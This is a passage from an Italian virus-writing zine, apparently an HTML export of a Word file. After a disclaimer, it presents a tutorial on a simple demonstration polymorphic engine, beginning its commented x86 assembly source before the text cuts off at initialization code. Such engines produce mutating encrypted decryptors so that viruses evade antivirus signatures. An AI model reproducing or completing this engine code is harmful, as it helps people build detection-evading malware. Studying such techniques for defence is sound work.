<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="./MATER_10_file/filelist.xml">
<title>  INDEX</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Administrator</o:Author>
  <o:LastAuthor>Administrator</o:LastAuthor>
  <o:Revision>2</o:Revision>
  <o:TotalTime>12</o:TotalTime>
  <o:Created>2001-02-12T09:28:00Z</o:Created>
  <o:LastSaved>2001-02-12T09:28:00Z</o:LastSaved>
  <o:Pages>15</o:Pages>
  <o:Words>6256</o:Words>
  <o:Characters>35662</o:Characters>
  <o:Lines>297</o:Lines>
  <o:Paragraphs>71</o:Paragraphs>
  <o:CharactersWithSpaces>43795</o:CharactersWithSpaces>
  <o:Version>9.2812</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:ActiveWritingStyle Lang="EN-US" VendorID="64" DLLVersion="131077"
   NLCheck="1">1</w:ActiveWritingStyle>
  <w:HyphenationZone>14</w:HyphenationZone>
  <w:DrawingGridHorizontalSpacing>6 pt</w:DrawingGridHorizontalSpacing>
  <w:DisplayHorizontalDrawingGridEvery>2</w:DisplayHorizontalDrawingGridEvery>
  <w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:Courier;
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:0;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:3 0 0 0 1 0;}
@font-face
	{font-family:"MS Mincho";
	panose-1:2 2 6 9 4 2 5 8 3 4;
	mso-font-alt:"\FF2D\FF33 \660E\671D";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-pitch:fixed;
	mso-font-signature:-1610612033 1757936891 16 0 131231 0;}
@font-face
	{font-family:"MS Gothic";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:"MS Mincho";
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:"\@MS Mincho";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-pitch:fixed;
	mso-font-signature:-1610612033 1757936891 16 0 131231 0;}
@font-face
	{font-family:"\@MS Gothic";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:128;
	mso-generic-font-family:modern;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
h1
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:1;
	mso-layout-grid-align:none;
	text-autospace:none;
	font-size:12.0pt;
	mso-bidi-font-size:16.0pt;
	font-family:"Times New Roman";
	mso-font-kerning:0pt;
	mso-ansi-language:EN-US;}
h2
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:2;
	mso-layout-grid-align:none;
	text-autospace:none;
	font-size:10.0pt;
	mso-bidi-font-size:8.0pt;
	font-family:"Courier New";}
h3
	{mso-style-next:Normale;
	margin-top:0cm;
	margin-right:0cm;
	margin-bottom:0cm;
	margin-left:18.0pt;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:3;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"MS Mincho";
	color:white;}
h5
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:5;
	font-size:14.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:Arial;
	color:white;}
p.MsoHeading8, li.MsoHeading8, div.MsoHeading8
	{mso-style-next:Normale;
	margin:0cm;
	margin-bottom:.0001pt;
	text-align:center;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:8;
	font-size:18.0pt;
	mso-bidi-font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCFFFF;}
p.MsoPlainText, li.MsoPlainText, div.MsoPlainText
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Times New Roman";}
pre
	{margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"MS Gothic";
	mso-hansi-font-family:"Courier New";
	mso-bidi-font-family:"Courier New";
	color:black;
	mso-fareast-language:JA;}
@page Section1
	{size:595.3pt 841.9pt;
	margin:1.0cm 1.0cm 1.0cm 1.0cm;
	mso-header-margin:35.45pt;
	mso-footer-margin:35.45pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
 /* List Definitions */
@list l0
	{mso-list-id:132060507;
	mso-list-type:hybrid;
	mso-list-template-ids:-598168204 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l0:level1
	{mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
@list l0:level4
	{mso-level-tab-stop:144.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
@list l1
	{mso-list-id:1136336534;
	mso-list-type:hybrid;
	mso-list-template-ids:1247848282 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l1:level1
	{mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
@list l2
	{mso-list-id:1334722478;
	mso-list-type:hybrid;
	mso-list-template-ids:1334197776 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l2:level1
	{mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
@list l3
	{mso-list-id:1448695814;
	mso-list-type:hybrid;
	mso-list-template-ids:1005480158 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l3:level1
	{mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
@list l4
	{mso-list-id:1598319725;
	mso-list-type:hybrid;
	mso-list-template-ids:-997012786 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l4:level1
	{mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
@list l5
	{mso-list-id:1831018286;
	mso-list-type:hybrid;
	mso-list-template-ids:-598168204 68157455 68157465 68157467 -327886272 68157465 68157467 68157455 68157465 68157467;}
@list l5:level1
	{mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
@list l5:level4
	{mso-level-number-format:bullet;
	mso-level-text:-;
	mso-level-tab-stop:144.0pt;
	mso-level-number-position:left;
	margin-left:143.0pt;
	text-indent:-17.0pt;
	font-family:"Times New Roman";}
@list l6
	{mso-list-id:1838225798;
	mso-list-type:hybrid;
	mso-list-template-ids:-466334410 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l6:level1
	{mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
@list l7
	{mso-list-id:1866137787;
	mso-list-type:hybrid;
	mso-list-template-ids:1310604880 68157455 68157465 68157467 68157455 68157465 68157467 68157455 68157465 68157467;}
@list l7:level1
	{mso-level-tab-stop:36.0pt;
	mso-level-number-position:left;
	text-indent:-18.0pt;}
ol
	{margin-bottom:0cm;}
ul
	{margin-bottom:0cm;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1026">
  <o:colormenu v:ext="edit" fillcolor="black"/>
 </o:shapedefaults></xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor=black lang=IT style='tab-interval:35.4pt'>

<div class=Section1>

<p class=MsoPlainText align=center style='text-align:center'><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>M</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#FF9900'>inima </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>A</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#FF9900'>nonyma </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>T</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#FF9900'>abularia </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>E</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#FF9900'>x </span></b><b><span
style='font-size:36.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:red'>R</span></b><b><span style='font-size:36.0pt;mso-bidi-font-size:
10.0pt;font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";
mso-bidi-font-family:"Courier New";color:#FF9900'>eti<o:p></o:p></span></b></p>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='font-size:11.0pt;mso-bidi-font-size:12.0pt;mso-fareast-font-family:"MS Mincho";
color:#33CCCC'>nihil vacuum neque sine signo apud MATER<o:p></o:p></span></i></p>

<h3><a name="_Ref500557024"><span style='color:#FFCC99'>Liber Decimus</span></a><span
style='color:#FFCC99'><o:p></o:p></span></h3>

<p class=MsoNormal align=center style='margin-left:18.0pt;text-align:center'><i><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></p>

<h2 align=center style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;
margin-left:30.0pt;margin-bottom:.0001pt;text-align:center;tab-stops:546.0pt'><span
style='font-size:9.0pt;mso-bidi-font-size:8.0pt;font-family:Arial;color:#E6E6E6;
font-weight:normal'>Questa è la zine ufficiale di Familia, un gruppo che ha
come oggetto di studio la programmazione virale.<o:p></o:p></span></h2>

<h2 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
30.0pt;margin-bottom:.0001pt;text-align:justify;tab-stops:546.0pt'><span
style='font-size:9.0pt;mso-bidi-font-size:8.0pt;font-family:Arial;color:#E6E6E6;
font-weight:normal'>MATER ha come scopo l’esame delle tecniche di
programmazione virale e delle problematiche ad esse associate. Questa è una
raccolta di contributi volontari (e non) di alcuni code-writers del pianeta, in
lingua italiana ed è rivolta soprattutto a chi si avvicina per la prima volta
al mondo dei virus e necessita dei concetti di base che spesso sono dati per
scontati nelle zines reperibili in Rete. Non è, tuttavia, una esemplificazione
discorsiva priva di contenuto tecnico: per comprendere gli esempi ivi contenuti
è necessaria una minima conoscenza dell’architettura di un elaboratore e del
linguaggio assembler.<o:p></o:p></span></h2>

<h2 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
30.0pt;margin-bottom:.0001pt;text-align:justify;tab-stops:546.0pt'><span
style='font-size:9.0pt;mso-bidi-font-size:8.0pt;font-family:Arial;color:#E6E6E6;
font-weight:normal'>E’ nostra convinzione che una migliore conoscenza delle
metodologie infettive digitali sia la principale strada per accrescere la
sicurezza degli utenti e fornire un contributo a chi opera nel settore della
programmazione. Ritenendo il vero nemico della sicurezza la disinformazione,
auspichiamo che una più profonda comprensione in questo campo dissipi i dubbi,
aiuti la ricerca e contribuisca al progresso dell’educazione informatica<i>.
Sursum Corda !</i><span style="mso-spacerun: yes">  </span><o:p></o:p></span></h2>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:30.0pt;margin-bottom:.0001pt;text-indent:24.0pt;tab-stops:546.0pt'><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;color:#E6E6E6'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:30.0pt;margin-bottom:.0001pt;text-indent:24.0pt;tab-stops:546.0pt'><span
style='color:#E6E6E6'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h5 style='margin-top:0cm;margin-right:42.0pt;margin-bottom:0cm;margin-left:
30.0pt;margin-bottom:.0001pt;text-indent:24.0pt;tab-stops:546.0pt'><span
style='font-size:12.0pt;color:#E6E6E6'>ATTENZIONE<o:p></o:p></span></h5>

<p class=MsoNormal style='margin-top:0cm;margin-right:42.0pt;margin-bottom:
0cm;margin-left:30.0pt;margin-bottom:.0001pt;text-align:justify;text-indent:
24.0pt;tab-stops:546.0pt'><span style='font-size:10.0pt;mso-bidi-font-size:
12.0pt;font-family:Arial;color:#E6E6E6'>Questa pubblicazione contiene
informazioni e codice sorgente relativi alla sicurezza informatica. </span><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:Arial;mso-fareast-font-family:
"MS Mincho";color:#E6E6E6'>Lo scopo di queste informazioni è di aiutare gli
utenti ad accrescere la propria capacità di programmazione. Questo materiale è
a puro scopo didattico e non include codice distruttivo né documenti attinenti
ad alcuna attività illegale. Si declina ogni responsabilità nel caso chiunque
utilizzi le suddette informazioni per creare, compilare e diffondere
intenzionalmente programmi diretti a danneggiare o interrompere un sistema
informatico o telematico, ovvero a provocarne l'interruzione, totale o
parziale, o l'alterazione del suo funzionamento <i>Art. 615-quinquies (Legge n.
547/93 pubblicata in Gazzetta Ufficiale n. 305 del 30.12.1993)</i></span><span
style='font-size:10.0pt;mso-bidi-font-size:12.0pt;font-family:Arial;color:#E6E6E6'><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:30.0pt;text-align:justify;text-indent:
24.0pt;tab-stops:546.0pt'><span style='font-family:Arial;color:#E6E6E6'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:30.0pt;text-indent:24.0pt;tab-stops:
546.0pt'><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:
"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#E6E6E6'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='margin-left:30.0pt;text-align:justify;text-indent:
24.0pt;tab-stops:546.0pt'><span style='color:#E6E6E6'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoHeading8><b><span lang=DE style='color:#FFCC99;mso-ansi-language:
DE'><span style="mso-spacerun: yes"> </span>§ MATER</span></b><span lang=DE
style='color:#FFCC99;mso-ansi-language:DE'> Liber Decimus <b>§<o:p></o:p></b></span></p>

<p class=MsoNormal><span lang=DE style='color:#FFCC99;mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<h2><span style='font-size:14.0pt;mso-bidi-font-size:8.0pt;font-family:"Times New Roman";
mso-bidi-font-family:"Courier New";color:#00CCFF;font-weight:normal'><span
style="mso-spacerun: yes">   </span></span><span style='font-size:14.0pt;
mso-bidi-font-size:8.0pt;font-family:"Times New Roman";mso-bidi-font-family:
"Courier New";color:white'>POLIMORFISMO - 4<o:p></o:p></span></h2>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:16.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-bidi-font-family:
"Courier New";color:aqua'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:red'>1.un esempio di
Motore Polimorfico.<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FF9900'>[DPE] - Demo Poly
Engine (basata sulla SPWM)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#FF9900'>di b0z0/iKX,
Luglio 1998<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify;tab-stops:366.0pt'><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC'>La DPE esaminata è un MP abbastanza semplice, di tipo
didattico/dimostrativo.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify;tab-stops:366.0pt'><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC'>Come afferma il suo autore, b0z0/iKX, essendo solo una poly di
esempio, manca di moltissime cose che una vera poly dovrebbe avere. Tuttavia la
sua semplicità la rende adatta al nostro scopo. Le RC risultanti risultano
relativamente corte. I registri usati come puntatori sono BX, SI e DI, mentre
come counter e pointer può essere utilizzato qualsiasi registro tranne l'AX (e
SP). La crittazione avviene con un’istruzione SUB/ADD/XOR con chiave fissa o
variabile, modificata ad ogni loop. La modifica della chiave avviene con un
SUB, ADD o XOR con un immediato a 16 bit. La generazione di istruzioni garbage
e'creata usando una tabella di riferimento. <o:p></o:p></span></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>Input:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>DS:DI<span
style="mso-spacerun: yes">   </span>= Puntatore alla zona di memoria dove
mettere il risultato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>DS:SI<span
style="mso-spacerun: yes">   </span>= Puntatore al codice da crittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>BP<span
style="mso-spacerun: yes">      </span>= Offset al quale questo codice verra'
eseguito<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>CX<span
style="mso-spacerun: yes">      </span>= Numero di bytes da crittare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>Output:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>DS:DX<span
style="mso-spacerun: yes">   </span>= Pointer al codice generato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>CX<span
style="mso-spacerun: yes">      </span>= Lunghezza del codice (decr + codice
crittato) generato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>poly:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">                </span>push<span
style="mso-spacerun: yes">    </span>di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Innanzitutto verranno salvati certi registri che ci serviranno
piu' tardi<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; nel corso della scrittura del decryptor. Vengono anche
inizializzate<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; alcune variabili nel codice (cambio chiave) e zone di memoria
(lista delle operazioni <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; gia' eseguite) che vengono cambiate dalla poly engine ad ogni
esecuzione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[lenght],cx<span style="mso-spacerun: yes">      </span>; lunghezza<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[given_si],si<span style="mso-spacerun: yes">    </span>; puntatore a cosa
crittare <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>xor<span
style="mso-spacerun: yes">     </span>ax,ax<span style="mso-spacerun:
yes">                        </span>; AX = 0 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; AX azzera 2 bytes alla volta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[change_key],ax<span style="mso-spacerun: yes">   </span>; num.cambi chiave
+ decr.contatore<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[change_key+2],ax ; incr. punatat. + op.mat.crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[change_key+4],ax ; 2 variabili<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>dec<span style="mso-spacerun: yes">     </span>ax<span
style="mso-spacerun: yes">                             </span>; 0ffh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[already_pnt],ax<span style="mso-spacerun: yes">   </span>; registro come
punt. </span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>+ reg.come contat.<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>byte ptr
ds:[already_pnt+2],al ; registro come chiave (byte)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>ax,9090h<span
style="mso-spacerun: yes">                       </span>; 90h = opcode di NOP<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[modify_key],ax<span style="mso-spacerun: yes">    </span>; cambio chiave (2
words) <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[modify_key+2],ax<span style="mso-spacerun: yes">  </span>; vedi sopra<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[pre_chk],ax<span style="mso-spacerun: yes">       </span>; cambio chiave
iniziale (2 words) <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
